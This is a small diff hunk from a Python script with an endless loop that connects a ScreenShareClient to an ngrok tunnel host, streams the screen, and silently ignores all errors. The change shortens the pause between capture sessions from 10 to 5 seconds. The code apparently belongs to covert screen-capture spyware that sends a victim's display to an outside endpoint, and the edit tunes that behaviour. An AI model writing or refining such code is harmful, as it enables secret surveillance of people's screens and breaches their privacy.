@@ -13,7 +13,7 @@ while(True):
     try:
         Client = ScreenShareClient("0.tcp.sa.ngrok.io",11992)
         Client.start_stream()
-        time.sleep(10)
+        time.sleep(5)
         Client.stop_stream()
     except:pass
 ####################################################################
